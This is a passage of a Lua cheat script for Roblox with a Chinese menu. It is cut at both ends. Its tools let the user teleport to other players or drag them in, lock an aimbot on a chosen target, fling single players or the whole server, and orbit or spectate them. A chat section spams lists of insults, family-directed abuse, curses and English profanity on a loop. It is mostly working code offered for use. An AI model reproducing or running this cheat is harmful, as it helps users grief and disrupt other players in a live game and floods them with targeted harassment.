                    RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
                    Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
                    Humanoid:ChangeState("GettingUp")
                    table.foreach(Character:GetChildren(), function(_, x)
                        if x:IsA("BasePart") then
                            x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                        end
                    end)
                    task.wait()
                until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
                Workspace.FallenPartsDestroyHeight = getgenv().FPDH
            else
                return Message("玩家消失", "已停止", 5)
            end
        end
    }
end)

run(function()
    _G.LSUI = {}
end)

run(function()
    local LS = _G.LSConfig
    local Utils = _G.LSUtils
    local Services = _G.LSServices
    local Fling = _G.LSFling
    local Players = Services.Players
    local LocalPlayer = Services.LocalPlayer
    local Workspace = Services.Workspace
    local RunService = Services.RunService
    
   
    Utils.shuaxinlb(true)
    
    local PlayersDropdown 
    
   
    Select:Dropdown("选择玩家显示名称类型", "Name Type", {"用户名", "昵称"}, function(value)
        LS.NameType = value
        Utils.shuaxinlb(true)
        if PlayersDropdown then
            PlayersDropdown:SetOptions(LS.dropdown)
            if LS.playernamedied and LS.playernamedied ~= "" and LS.playernamedied ~= "所有人" then
                local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
                if targetPlayer then
                    local newDisplayName = LS.NameType == "昵称" and targetPlayer.DisplayName or targetPlayer.Name
                    for _, option in ipairs(LS.dropdown) do
                        if option == newDisplayName then
                            PlayersDropdown:SetValue(option)
                            LS.playernamedied = option
                            break
                        end
                    end
                end
            end
        end
    end)
    
   
    PlayersDropdown = Select:Dropdown("选择玩家", 'Dropdown', LS.dropdown, function(v)
        LS.playernamedied = v
    end)
    
    Select:Button("刷新玩家列表", function()
        Utils.shuaxinlb(true)
        PlayersDropdown:SetOptions(LS.dropdown)
    end)
    
    Select:Toggle("自动刷新玩家列表", "Auto Refresh", false, function(state)
        if state then
            Utils.startAutoRefresh(PlayersDropdown)
        else
            Utils.stopAutoRefresh()
        end
    end)
    
    Select:Textbox("刷新间隔(秒)", "", "5", function(v)
        local num = tonumber(v)
        if num and num > 0 then
            LS.RefreshInterval = num
        end
    end)
    
   
    local Select2 = PIJIAOBEN:section("距离方向", false)    
    
    Select2:Dropdown("选择[传送丨吸人]方向", "", {"前面", "后面", "左面", "右面", "上面", "下面"}, function(v)
        LS.Direction = v
    end)
    
    Select2:Textbox("设置[传送丨吸人]距离", "", "3", function(v)
        local num = tonumber(v)
        if num and num > 0 then
            LS.Distance = num
        end
    end)
    
  
    local Select3 = PIJIAOBEN:section("传送玩家", false)
    
    Select3:Button("传送到玩家旁边", function()
        local HumRoot = Players.LocalPlayer.Character.HumanoidRootPart
        if LS.playernamedied == "所有人" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart then
                    if not Utils.isProtected(player) then
                        local targetPos = Utils.getTeleportPosition(player.Character.HumanoidRootPart, LS.Direction, LS.Distance)
                        HumRoot.CFrame = targetPos
                        wait(0.5)
                    end
                end
            end
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已传送到所有玩家身边",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        else
            local tp_player = Utils.getPlayerByName(LS.playernamedied)
            if tp_player and tp_player.Character and tp_player.Character.HumanoidRootPart then
                if Utils.isProtected(tp_player) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家受到保护，无法传送",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                local targetPos = Utils.getTeleportPosition(tp_player.Character.HumanoidRootPart, LS.Direction, LS.Distance)
                HumRoot.CFrame = targetPos
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "已经传送到玩家身边",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            else
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "无法传送 原因: 玩家已消失",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            end
        end
    end)
    
    Select3:Toggle("循环锁定传送", "Loop", false, function(state)
        if state then
            LS.LoopTeleport = true
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已开启循环传送",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
            spawn(function()
                while LS.LoopTeleport do
                    local HumRoot = Players.LocalPlayer.Character.HumanoidRootPart
                    if LS.playernamedied == "所有人" then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart then
                                if not Utils.isProtected(player) then
                                    local targetPos = Utils.getTeleportPosition(player.Character.HumanoidRootPart, LS.Direction, LS.Distance)
                                    HumRoot.CFrame = targetPos
                                    wait(0.5)
                                end
                            end
                        end
                    else
                        local tp_player = Utils.getPlayerByName(LS.playernamedied)
                        if tp_player and tp_player.Character and tp_player.Character.HumanoidRootPart then
                            if not Utils.isProtected(tp_player) then
                                local targetPos = Utils.getTeleportPosition(tp_player.Character.HumanoidRootPart, LS.Direction, LS.Distance)
                                HumRoot.CFrame = targetPos
                            end
                        end
                    end
                    wait()
                end
            end)
        else
            LS.LoopTeleport = false
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已关闭循环传送",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
    
    Select3:Button("把玩家传送过来", function()
        local HumRoot = Players.LocalPlayer.Character.HumanoidRootPart
        if LS.playernamedied == "所有人" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart then
                    if not Utils.isProtected(player) and not Utils.isVIP(player) then
                        local targetPos = Utils.getTeleportPosition(HumRoot, LS.Direction, LS.Distance)
                        player.Character.HumanoidRootPart.CFrame = targetPos
                        wait(0.5)
                    end
                end
            end
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已将所有玩家传送过来",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        else
            local tp_player = Utils.getPlayerByName(LS.playernamedied)
            if tp_player and tp_player.Character and tp_player.Character.HumanoidRootPart then
                if Utils.isProtected(tp_player) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家受到保护，无法传送",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                if Utils.isVIP(tp_player) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家是VIP用户，无法传送",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                local targetPos = Utils.getTeleportPosition(HumRoot, LS.Direction, LS.Distance)
                tp_player.Character.HumanoidRootPart.CFrame = targetPos
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "已将玩家传送过来",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            else
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "无法传送 原因: 玩家已消失",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            end
        end
    end)
    
    Select3:Toggle("循环传送玩家过来", "Loop", false, function(state)
        if state then
            LS.LoopTeleport = true
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已开启循环传送玩家过来",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
            spawn(function()
                while LS.LoopTeleport do
                    local HumRoot = Players.LocalPlayer.Character.HumanoidRootPart
                    if LS.playernamedied == "所有人" then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart then
                                if not Utils.isProtected(player) and not Utils.isVIP(player) then
                                    local targetPos = Utils.getTeleportPosition(HumRoot, LS.Direction, LS.Distance)
                                    player.Character.HumanoidRootPart.CFrame = targetPos
                                    wait(0.5)
                                end
                            end
                        end
                    else
                        local tp_player = Utils.getPlayerByName(LS.playernamedied)
                        if tp_player and tp_player.Character and tp_player.Character.HumanoidRootPart then
                            if not Utils.isProtected(tp_player) and not Utils.isVIP(tp_player) then
                                local targetPos = Utils.getTeleportPosition(HumRoot, LS.Direction, LS.Distance)
                                tp_player.Character.HumanoidRootPart.CFrame = targetPos
                            end
                        end
                    end
                    wait()
                end
            end)
        else
            LS.LoopTeleport = false
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已关闭循环传送玩家过来",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
    
    local Select4 = PIJIAOBEN:section("其他", false)
    
    Select4:Toggle("开启指定自瞄目标", "Aimbot", false, function(Aimbot)
        if Aimbot then
            if LS.playernamedied == "所有人" then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "不能同时瞄准所有玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
            if not targetPlayer then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "找不到指定玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            if Utils.isProtected(targetPlayer) then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "该玩家受到保护，无法自瞄",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            if LS.aimbotLoop then
                LS.aimbotLoop:Disconnect()
            end
            
            LS.aimbotLoop = RunService.RenderStepped:Connect(function()
                local Cam = Workspace.CurrentCamera
                local target = targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                
                if target and Cam then
                    local lookVector = (target.Position - Cam.CFrame.Position).unit
                    local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
                    Cam.CFrame = newCFrame
                else
                    if LS.aimbotLoop then
                        LS.aimbotLoop:Disconnect()
                        LS.aimbotLoop = nil
                    end
                end
            end)
        else
            if LS.aimbotLoop then
                LS.aimbotLoop:Disconnect()
                LS.aimbotLoop = nil
            end
        end
    end)
    
    Select4:Toggle("吸全部玩家", "Get All", false, function(state)
        if state then
            spawn(function()
                while state do
                    for i, v in next, Players:GetPlayers() do
                        if v.Name ~= Players.LocalPlayer.Name then
                            if not Utils.isProtected(v) and not Utils.isVIP(v) then
                                local targetPos = Utils.getTeleportPosition(Players.LocalPlayer.Character.HumanoidRootPart, LS.Direction, LS.Distance)
                                v.Character.HumanoidRootPart.CFrame = targetPos
                                wait()
                            end
                        end
                    end
                end
            end)
        end
    end)
    
    Select4:Toggle("查看玩家", "look player", false, function(state)
        if state then
            if LS.playernamedied == "所有人" then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "不能同时查看所有玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return
            end
            local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character.Humanoid then
                if Utils.isProtected(targetPlayer) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家受到保护，无法查看",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                Workspace.CurrentCamera.CameraSubject = targetPlayer.Character.Humanoid
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "已开启查看玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            else
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "找不到指定玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
            end
        else
            local lp = Players.LocalPlayer
            if lp.Character and lp.Character.Humanoid then
                Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
            end
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已关闭查看玩家",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)

    local Select5 = PIJIAOBEN:section("环绕玩家", false)
    
    Select5:Textbox("设置环绕半径", "", "5", function(v)
        local num = tonumber(v)
        if num and num > 0 then
            LS.OrbitRadius = num
        end
    end)
    
    Select5:Textbox("设置环绕速度", "", "1", function(v)
        local num = tonumber(v)
        if num and num > 0 then
            LS.OrbitSpeed = num
        end
    end)
    
    Select5:Toggle("环绕玩家", "Orbit Player", false, function(state)
        if state then
            if LS.playernamedied == "所有人" then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "不能同时环绕所有玩家",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
            if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "找不到指定玩家或玩家没有HumanoidRootPart",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            if Utils.isProtected(targetPlayer) then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "该玩家受到保护，无法环绕",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已开启环绕玩家",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
            
            local localPlayer = Players.LocalPlayer
            local localHRP = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not localHRP then
                XPHUBNotification:Notification({
                    Title = "皮脚本",
                    Text = "本地玩家没有HumanoidRootPart",
                    Icon = "rbxassetid://136169594232359",
                    Duration = 3
                })
                return false
            end
            
            local angle = 0
            LS.OrbitLoop = RunService.Heartbeat:Connect(function()
                if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    if LS.OrbitLoop then
                        LS.OrbitLoop:Disconnect()
                        LS.OrbitLoop = nil
                    end
                    return
                end
                
                local targetHRP = targetPlayer.Character.HumanoidRootPart
                localHRP = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                
                if not localHRP then
                    if LS.OrbitLoop then
                        LS.OrbitLoop:Disconnect()
                        LS.OrbitLoop = nil
                    end
                    return
                end
                
                angle = angle + LS.OrbitSpeed * 0.05
                if angle > 360 then
                    angle = angle - 360
                end
                
                local x = math.cos(angle) * LS.OrbitRadius
                local z = math.sin(angle) * LS.OrbitRadius
                
                local targetPos = targetHRP.Position + Vector3.new(x, 0, z)
                localHRP.CFrame = CFrame.new(targetPos, targetHRP.Position)
            end)
        else
            if LS.OrbitLoop then
                LS.OrbitLoop:Disconnect()
                LS.OrbitLoop = nil
            end
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "已关闭环绕玩家",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
        end
    end)
    
    local Select6 = PIJIAOBEN:section("甩飞玩家", false)
    
    Select6:Button("甩飞一次", function()
        if LS.playernamedied == nil then return end
        
        local Targets = {}
        if LS.playernamedied == "所有人" then
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer then
                    if not Utils.isProtected(player) and not Utils.isVIP(player) then
                        table.insert(Targets, player.Name)
                    end
                end
            end
        else
            local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
            if targetPlayer then
                if Utils.isProtected(targetPlayer) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家受到保护，无法甩飞",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                if Utils.isVIP(targetPlayer) then
                    XPHUBNotification:Notification({
                        Title = "皮脚本",
                        Text = "该玩家是VIP用户，无法甩飞",
                        Icon = "rbxassetid://136169594232359",
                        Duration = 3
                    })
                    return
                end
                table.insert(Targets, targetPlayer.Name)
            else
                table.insert(Targets, LS.playernamedied)
            end
        end
        
        if #Targets == 0 then
            XPHUBNotification:Notification({
                Title = "皮脚本",
                Text = "没有可甩飞的玩家",
                Icon = "rbxassetid://136169594232359",
                Duration = 3
            })
            return
        end
        
        local Player = Players.LocalPlayer
        local AllBool = false
        
        local Message = function(_Title, _Text, Time)
            XPHUBNotification:Notification({
                Title = _Title,
                Text = _Text,
                Icon = "rbxassetid://136169594232359",
                Duration = Time
            })
        end
        
        if Targets[1] then
            for _, x in next, Targets do
                local p, ab = Fling.GetPlayer(x, Player, AllBool)
                AllBool = ab
            end
        else
            return
        end
        
        if AllBool then
            for _, x in next, Players:GetPlayers() do
                if x ~= Player and not Utils.isProtected(x) and not Utils.isVIP(x) then
                    Fling.SkidFling(x, Player, AllBool, Message)
                end
            end
        end
        
        for _, x in next, Targets do
            local TPlayer, ab = Fling.GetPlayer(x, Player, AllBool)
            AllBool = ab
            if TPlayer and TPlayer ~= Player then
                if TPlayer then
                    Fling.SkidFling(TPlayer, Player, AllBool, Message)
                end
            elseif not TPlayer and not AllBool then
                Message("未获取到玩家或工具", "已停止", 5)
            end
        end
    end)
    
    Select6:Toggle("循环甩飞", "AutoFling", false, function(t)
        if LS.playernamedied == nil then return end
        
        getgenv().autofling = t
        spawn(function()
            while getgenv().autofling do
                wait()
                pcall(function()
                    local Targets = {}
                    if LS.playernamedied == "所有人" then
                        for _, player in pairs(Players:GetPlayers()) do
                            if player ~= Players.LocalPlayer and not Utils.isProtected(player) and not Utils.isVIP(player) then
                                table.insert(Targets, player.Name)
                            end
                        end
                    else
                        local targetPlayer = Utils.getPlayerByName(LS.playernamedied)
                        if targetPlayer then
                            if Utils.isProtected(targetPlayer) or Utils.isVIP(targetPlayer) then
                                return
                            end
                            table.insert(Targets, targetPlayer.Name)
                        else
                            table.insert(Targets, LS.playernamedied)
                        end
                    end
                    
                    if #Targets == 0 then return end
                    
                    local Player = Players.LocalPlayer
                    local AllBool = false
                    
                    if Targets[1] then
                        for _, x in next, Targets do
                            local p, ab = Fling.GetPlayer(x, Player, AllBool)
                            AllBool = ab
                        end
                    else
                        return
                    end
                    
                    if AllBool then
                        for _, x in next, Players:GetPlayers() do
                            if x ~= Player and not Utils.isProtected(x) and not Utils.isVIP(x) then
                                Fling.SkidFling(x, Player, AllBool, function() end)
                            end
                        end
                    end
                    
                    for _, x in next, Targets do
                        local TPlayer, ab = Fling.GetPlayer(x, Player, AllBool)
                        AllBool = ab
                        if TPlayer and TPlayer ~= Player then
                            if TPlayer then
                                Fling.SkidFling(TPlayer, Player, AllBool, function() end)
                            end
                        end
                    end
                end)
            end
        end)
    end)
end)

run(function()
    local Players = _G.LSServices.Players
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        if _G.LSConfig and _G.LSConfig.AutoRefresh then
            task.wait(1)
        end
    end)
end)

local run = function(func) func() end

run(function()
    _G.ChatServices = {
        TextChatService = game:GetService("TextChatService"),
        ReplicatedStorage = game:GetService("ReplicatedStorage")
    }
end)

run(function()
    local TextChatService = _G.ChatServices.TextChatService
    local ReplicatedStorage = _G.ChatServices.ReplicatedStorage
    
    _G.ChatUtils = {
        SendChatMessage = function(message)
            if message == nil or message == "" then return end
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannel = TextChatService.TextChannels.RBXGeneral
                textChannel:SendAsync(message)
            else
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            end
        end
    }
end)

run(function()
    _G.SendChatMessage = function(message)
        if _G.ChatUtils and _G.ChatUtils.SendChatMessage then
            _G.ChatUtils.SendChatMessage(message)
        end
    end
end)

run(function()
    _G.ChatConfig = {
        message = "",
        sayCount = 1,
        sayFast = false,
        autoSay = false,
        sayInterval = 0.1,  
        autoSayInterval = 0.1  
    }
end)

run(function()
    _G.ChatSpamConfig = {
        activeFeatures = {
            szj = false,
            sz = false,
            sb = false,
            ct = false,
            szlp = false,
            gjwh = false,
            zzxl = false,
            rsgj = false,
            zjcf = false
        }
    }
end)

run(function()
    local ChatConfig = _G.ChatConfig
    local SendChatMessage = _G.ChatUtils.SendChatMessage
    local config = _G.ChatSpamConfig
    
    local PIJIAOBEN = XIAOPI:Tab("自动说话","136169594232359")
    local about = PIJIAOBEN:section("自动说话", true)
    local about2 = PIJIAOBEN:section("骂人区", true)
    
    about:Textbox("输入你要说的话", 'TextBoxFlag', "输入", function(txt)
        ChatConfig.message = txt
    end)
    
    about:Textbox("说话次数", 'TextBoxFlag2', "输入说话次数", function(txt)
        ChatConfig.sayCount = tonumber(txt) or 1
    end)
    
    about:Textbox("设置说话间隔(秒)", 'TextBoxFlag3', "输入(默认0.1)", function(txt)
        local num = tonumber(txt)
        if num and num >= 0 then
            ChatConfig.sayInterval = num
        else
            ChatConfig.sayInterval = 0.1
        end
    end)
    
    about:Button("说话", function()
        ChatConfig.sayFast = true
        task.spawn(function()
            for i = 1, ChatConfig.sayCount do
                if not ChatConfig.sayFast then break end
                SendChatMessage(ChatConfig.message)
                task.wait(ChatConfig.sayInterval)  
            end
            ChatConfig.sayFast = false
        end)
    end)
    
    about:Button("停止说话", function()
        ChatConfig.sayFast = false  
    end)
    
    about:Textbox("设置全自动说话间隔(秒)", '', "输入(默认0.1)", function(txt)
        local num = tonumber(txt)
        if num and num >= 0 then
            ChatConfig.autoSayInterval = num
        else
            ChatConfig.autoSayInterval = 0.1
        end
    end)
    
    about:Toggle("全自动说话", 'ToggleFlag', false, function(state)
        ChatConfig.autoSay = state
        if state then
            task.spawn(function()  
                while ChatConfig.autoSay do
                    if ChatConfig.message ~= "" then
                        SendChatMessage(ChatConfig.message)
                    end
                    task.wait(ChatConfig.autoSayInterval)  
                end
            end)
        end
    end)
    
    about2:Label("Roblox发言有限制 连续7条后要冷却10秒")
    
    function szj()
        local messages = {"是不是", "啥不啥", "蠢不蠢", "糙逆馬", "词穷猪", "窝囊废", "逗不逗", "穷啥乐", "速度点", "面对我", "狗篮子"}
        while config.activeFeatures.szj do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.szj then break end
                SendChatMessage(msg)
                task.wait(0.5)
            end
        end
    end
    
    about2:Toggle("三字经", "MR0.5", false, function(Value) 
        config.activeFeatures.szj = Value
        if Value then
            task.spawn(szj)
        end
    end)
    
    function sz()
        local messages = {"狗仗人势", "猪狗不如", "狼心狗肺", "厚颜无耻", "恬不知耻", "丝跌浪馬", "阳奉阴违", "衣冠禽兽", "人面兽心", "蛇蝎心肠"}
        while config.activeFeatures.sz do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.sz then break end
                SendChatMessage(msg)
                task.wait(0.5)
            end
        end
    end
    
    about2:Toggle("四字成语", "MR2", false, function(Value) 
        config.activeFeatures.sz = Value
        if Value then
            task.spawn(sz)
        end
    end)
    
    function sb()
        local messages = {"损人不利己", "害人又害己", "活着浪费空气 死了浪费土地", "给你爱因斯坦的脑子都没用", "整天不干正事", "没用的东西", "人渣中的人渣", "败类中的败类"}
        while config.activeFeatures.sb do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.sb then break end
                SendChatMessage(msg)
                task.wait(0.5)
            end
        end
    end
    
    about2:Toggle("骂人语录", "MR3", false, function(Value)  
        config.activeFeatures.sb = Value
        if Value then
            task.spawn(sb)
        end
    end)
    
    function ct()
        local messages = {"就这？就这？", "太菜了太菜了", "回家练练再来", "键盘撒把米", "鸡都比你玩得好", "手残党别玩了", "建议卸载游戏", "小学生放假了？", "操作太下饭了", "我奶奶都比你强"}
        while config.activeFeatures.ct do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.ct then break end
                SendChatMessage(msg)
                task.wait(0.5)
            end
        end
    end
    
    about2:Toggle("嘲讽语录", "MR4", false, function(Value)
        config.activeFeatures.ct = Value
        if Value then
            task.spawn(ct)
        end
    end)
    
    function szlp()
        local messages = {"你妈买菜必涨价", "你爸打牌必点炮", "你爷下棋必被指指点点", "你奶跳舞必扰民", "你姐化妆必卡粉", "你哥打游戏必掉线", "你弟写作业必磨蹭", "你妹吃零食必长胖"}
        while config.activeFeatures.szlp do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.szlp then break end
                SendChatMessage(msg)
                task.wait(0.3)
            end
        end
    end
    
    about2:Toggle("素质连喷", "MR5", false, function(Value)
        config.activeFeatures.szlp = Value
        if Value then
            task.spawn(szlp)
        end
    end)
    
    function gjwh()
        local messages = {"Fuck you", "Son of a bitch", "Motherfucker", "Asshole", "Damn you", "Go to hell", "You piece of shit", "Kiss my ass", "Get lost", "Shut up"}
        while config.activeFeatures.gjwh do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.gjwh then break end
                SendChatMessage(msg)
                task.wait(0.5)
            end
        end
    end
    
    about2:Toggle("国际问候", "MR6", false, function(Value)
        config.activeFeatures.gjwh = Value
        if Value then
            task.spawn(gjwh)
        end
    end)
    
    function zzxl()
        local messages = {"祝你上厕所没纸", "祝你吃泡面没调料", "祝你网购必踩雷", "祝你外卖必超时", "祝你手机必没电", "祝你下雨必没伞", "祝你排队必被插", "祝你打车必堵车", "祝你睡觉必失眠", "祝你喝水必塞牙"}
        while config.activeFeatures.zzxl do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.zzxl then break end
                SendChatMessage(msg)
                task.wait(0.6)
            end
        end
    end
    
    about2:Toggle("诅咒系列", "MR7", false, function(Value)
        config.activeFeatures.zzxl = Value
        if Value then
            task.spawn(zzxl)
        end
    end)
    
    function rsgj()
        local messages = {"你是狗吧", "脑子进水了", "眼瞎了吗", "手残就别玩", "嘴臭王者", "孤儿玩家", "送人头专业户", "演员请就位", "坑货一个", "菜鸡互啄"}
        while config.activeFeatures.rsgj do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.rsgj then break end
                SendChatMessage(msg)
                task.wait(0.4)
            end
        end
    end
    
    about2:Toggle("人身攻击", "MR8", false, function(Value)
        config.activeFeatures.rsgj = Value
        if Value then
            task.spawn(rsgj)
        end
    end)
    
    function zjcf()
        local messages = {"你这操作", "让我想起了", "我三岁的侄子", "他都比你强", "建议你换个", "简单点的游戏", "比如连连看", "或者扫雷", "那个适合你", "真的"}
        while config.activeFeatures.zjcf do
            for _, msg in ipairs(messages) do
                if not config.activeFeatures.zjcf then break end
                SendChatMessage(msg)
                task.wait(0.7)
            end
        end
    end
    
    about2:Toggle("终极嘲讽", "MR9", false, function(Value)
        config.activeFeatures.zjcf = Value
        if Value then
            task.spawn(zjcf)
        end
    end)
end)

local PIJIAOBEN = XIAOPI:Tab("时间","136169594232359")

local about = PIJIAOBEN:section("时间", false)

do
    local labels = {}
    local holidays = {
        {name = "当前时间", date = nil, type = "normal"},
        {name = "元旦", date = {2027,1,1}, type = "happy"},
        {name = "情人节", date = {2027,2,14}, type = "happy"},
        {name = "除夕", date = {2027,2,15}, type = "happy"}, 
        {name = "春节", date = {2027,2,16}, type = "happy"},  
        {name = "元宵节", date = {2027,3,2}, type = "happy"}, 
        {name = "妇女节", date = {2027,3,8}, type = "happy"},
        {name = "植树节", date = {2027,3,12}, type = "action"},
        {name = "白色情人节", date = {2027,3,14}, type = "happy"},
        {name = "消费者权益日", date = {2027,3,15}, type = "action"},
        {name = "圣帕特里克节", date = {2027,3,17}, type = "happy"},
        {name = "春分", date = {2027,3,20}, type = "normal"},
        {name = "世界睡眠日", date = {2027,3,21}, type = "action"},
        {name = "世界水日", date = {2027,3,22}, type = "action"},
        {name = "世界气象日", date = {2027,3,23}, type = "action"},
        {name = "愚人节", date = {2027,4,1}, type = "happy"},
        {name = "清明节", date = {2027,4,5}, type = "sad"},  
        {name = "世界卫生日", date = {2027,4,7}, type = "action"},
        {name = "复活节", date = {2027,4,4}, type = "happy"},  
        {name = "世界地球日", date = {2027,4,22}, type = "action"},
        {name = "世界读书日", date = {2027,4,23}, type = "action"},
        {name = "知识产权日", date = {2027,4,26}, type = "action"},
        {name = "劳动节", date = {2027,5,1}, type = "happy"},
        {name = "青年节", date = {2027,5,4}, type = "happy"},
        {name = "世界微笑日", date = {2027,5,8}, type = "happy"},
        {name = "母亲节", date = {2027,5,9}, type = "happy"},  
        {name = "护士节", date = {2027,5,12}, type = "happy"},
        {name = "国际家庭日", date = {2027,5,15}, type = "happy"},
        {name = "世界电信日", date = {2027,5,17}, type = "action"},
        {name = "国际博物馆日", date = {2027,5,18}, type = "action"},
        {name = "全国助残日", date = {2027,5,16}, type = "action"},
        {name = "世界文化发展日", date = {2027,5,21}, type = "action"},
        {name = "儿童节", date = {2026,6,1}, type = "happy"},
        {name = "世界环境日", date = {2026,6,5}, type = "action"},
        {name = "全国爱眼日", date = {2026,6,6}, type = "action"},
        {name = "端午节", date = {2026,6,18}, type = "happy"},
        {name = "父亲节", date = {2026,6,21}, type = "happy"},
        {name = "国际奥林匹克日", date = {2026,6,23}, type = "action"},
        {name = "全国土地日", date = {2026,6,25}, type = "action"},
        {name = "建党节", date = {2026,7,1}, type = "happy"},
        {name = "国际接吻日", date = {2026,7,6}, type = "happy"},
        {name = "世界人口日", date = {2026,7,11}, type = "action"},
        {name = "世界表情包日", date = {2026,7,17}, type = "happy"},
        {name = "国际友谊日", date = {2026,7,30}, type = "happy"},
        {name = "建军节", date = {2026,8,1}, type = "happy"},
        {name = "七夕节", date = {2026,8,25}, type = "happy"},
        {name = "中元节", date = {2026,9,6}, type = "sad"},
        {name = "教师节", date = {2026,9,10}, type = "happy"},
        {name = "世界清洁地球日", date = {2026,9,14}, type = "action"},
        {name = "国际和平日", date = {2026,9,21}, type = "action"},
        {name = "中秋节", date = {2026,9,25}, type = "happy"},
        {name = "世界旅游日", date = {2026,9,27}, type = "action"},
        {name = "国庆节", date = {2026,10,1}, type = "happy"},
        {name = "世界动物日", date = {2026,10,4}, type = "action"},
        {name = "世界教师日", date = {2026,10,5}, type = "happy"},
        {name = "世界精神卫生日", date = {2026,10,10}, type = "action"},
